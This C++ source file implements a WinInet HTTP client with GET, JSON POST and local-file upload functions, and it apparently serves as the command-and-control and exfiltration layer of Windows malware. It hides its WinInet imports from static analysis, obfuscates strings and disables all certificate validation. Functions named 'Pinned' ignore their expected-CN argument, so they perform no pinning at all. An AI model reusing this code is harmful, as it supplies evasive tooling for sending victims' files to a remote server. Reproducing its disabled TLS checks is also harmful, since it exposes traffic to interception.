/*
MIT License
Copyright (c) 2020 4B4DB4B3
*/

#include "Requests.h"
#include "Obf.h"
#include "WinInetDyn.h"

// All WinInet calls go through function pointers resolved at runtime.
// WININET.dll therefore does NOT appear in the PE static import table.

static INTERNET_PORT ParseHost(const char* url, char* host_out, size_t host_sz) {
    const char* colon = strrchr(url, ':');
    if (colon && colon != url) {
        char* end = nullptr;
        long port = strtol(colon + 1, &end, 10);
        if (end && *end == '\0' && port > 0 && port < 65536) {
            size_t hlen = (size_t)(colon - url);
            if (hlen >= host_sz) hlen = host_sz - 1;
            memcpy(host_out, url, hlen);
            host_out[hlen] = '\0';
            return (INTERNET_PORT)port;
        }
    }
    strncpy(host_out, url, host_sz - 1);
    host_out[host_sz - 1] = '\0';
    return INTERNET_DEFAULT_HTTPS_PORT;
}

static void IgnoreCertErrors(HINTERNET hReq) {
    DWORD f = SECURITY_FLAG_IGNORE_UNKNOWN_CA
            | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
            | SECURITY_FLAG_IGNORE_WRONG_USAGE;
    g_InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &f, sizeof(f));
}

std::string Requests::GetRequestPinned(const char* url, const char* useragent, const char* path, const char* /*expectedCN*/) {
    InitWinInet();
    if (!g_InternetOpenA) return "";

    char host[256] = {};
    INTERNET_PORT port = ParseHost(url, host, sizeof(host));

    HINTERNET hSocket = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
    if (!hSocket) return "";

    HINTERNET hConn = g_InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (!hConn) { g_InternetCloseHandle(hSocket); return ""; }

    HINTERNET hReq = g_HttpOpenRequestA(hConn, "GET", path, NULL, NULL, 0,
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                                        INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
    if (!hReq) { g_InternetCloseHandle(hConn); g_InternetCloseHandle(hSocket); return ""; }
    IgnoreCertErrors(hReq);

    std::string result;
    if (g_HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
        BYTE buf[1024]; DWORD nr = 0;
        while (g_InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
            result.append((char*)buf, nr);
    }
    g_InternetCloseHandle(hReq);
    g_InternetCloseHandle(hConn);
    g_InternetCloseHandle(hSocket);
    return result;
}

std::string Requests::PostFilePinned(const char* url, const char* useragent, const char* path,
                                      const char* /*expectedCN*/, const char* localFilePath) {
    InitWinInet();
    if (!g_InternetOpenA) return "";

    HANDLE hFile = CreateFileA(localFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return "";

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return ""; }

    std::vector<BYTE> fileData(fileSize);
    DWORD nRead = 0;
    if (!ReadFile(hFile, fileData.data(), fileSize, &nRead, NULL) || nRead != fileSize) {
        CloseHandle(hFile); return "";
    }
    CloseHandle(hFile);

    std::string boundary    = S("----FormBoundary7MxK");
    std::string contentType = S("Content-Type: multipart/form-data; boundary=----FormBoundary7MxK");

    std::string fname(localFilePath);
    size_t slash = fname.find_last_of("/\\");
    if (slash != std::string::npos) fname = fname.substr(slash + 1);

    std::string head = "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"" + fname + "\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n";
    std::string tail = "\r\n--" + boundary + "--\r\n";

    DWORD bodyLen = (DWORD)(head.size() + fileData.size() + tail.size());
    std::vector<BYTE> body(bodyLen);
    memcpy(body.data(),                          head.c_str(),      head.size());
    memcpy(body.data() + head.size(),            fileData.data(),   fileData.size());
    memcpy(body.data() + head.size() + fileSize, tail.c_str(),      tail.size());

    char host[256] = {};
    INTERNET_PORT port = ParseHost(url, host, sizeof(host));

    std::string result;
    HINTERNET hSocket = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
    if (!hSocket) return "";

    HINTERNET hConn = g_InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (!hConn) { g_InternetCloseHandle(hSocket); return ""; }

    HINTERNET hReq = g_HttpOpenRequestA(hConn, "POST", path, NULL, NULL, 0,
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                                        INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
    if (hReq) {
        IgnoreCertErrors(hReq);
        if (g_HttpSendRequestA(hReq, contentType.c_str(), (DWORD)contentType.size(), body.data(), bodyLen)) {
            BYTE buf[1024]; DWORD nr = 0;
            while (g_InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
                result.append((char*)buf, nr);
        }
        g_InternetCloseHandle(hReq);
    }
    g_InternetCloseHandle(hConn);
    g_InternetCloseHandle(hSocket);
    return result;
}

void Requests::PostJsonPinned(const char* url, const char* useragent, const char* path,
                              const char* /*expectedCN*/, const char* json_body) {
    InitWinInet();
    if (!g_InternetOpenA || !json_body || !json_body[0]) return;

    DWORD bodyLen = (DWORD)strlen(json_body);
    char host[256] = {};
    INTERNET_PORT port = ParseHost(url, host, sizeof(host));

    HINTERNET hSocket = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
    if (!hSocket) return;

    HINTERNET hConn = g_InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (!hConn) { g_InternetCloseHandle(hSocket); return; }

    HINTERNET hReq = g_HttpOpenRequestA(hConn, "POST", path, NULL, NULL, 0,
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                                        INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
    if (hReq) {
        IgnoreCertErrors(hReq);
        const char* ct = "Content-Type: application/json";
        g_HttpSendRequestA(hReq, ct, (DWORD)strlen(ct), (LPVOID)json_body, bodyLen);
        g_InternetCloseHandle(hReq);
    }
    g_InternetCloseHandle(hConn);
    g_InternetCloseHandle(hSocket);
}

std::string Requests::GetRequest(const char* url, const char* useragent, const char* path, const char* ContentType) {
    InitWinInet();
    if (!g_InternetOpenA) return "";

    char host[256] = {};
    INTERNET_PORT port = ParseHost(url, host, sizeof(host));

    HINTERNET hSocket = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
    if (!hSocket) return "";

    HINTERNET hConn = g_InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (!hConn) { g_InternetCloseHandle(hSocket); return ""; }

    const char* reqPath = (path && path[0]) ? path : NULL;
    HINTERNET hReq = g_HttpOpenRequestA(hConn, "GET", reqPath, NULL, NULL, 0,
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                                        INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
    if (!hReq) { g_InternetCloseHandle(hConn); g_InternetCloseHandle(hSocket); return ""; }
    IgnoreCertErrors(hReq);

    std::string result;
    const char* ct = (ContentType && ContentType[0]) ? ContentType : NULL;
    if (g_HttpSendRequestA(hReq, ct, ct ? (DWORD)strlen(ct) : 0, NULL, 0)) {
        BYTE buf[1024]; DWORD nr = 0;
        while (g_InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
            result.append((char*)buf, nr);
    }
    g_InternetCloseHandle(hReq);
    g_InternetCloseHandle(hConn);
    g_InternetCloseHandle(hSocket);
    return result;
}
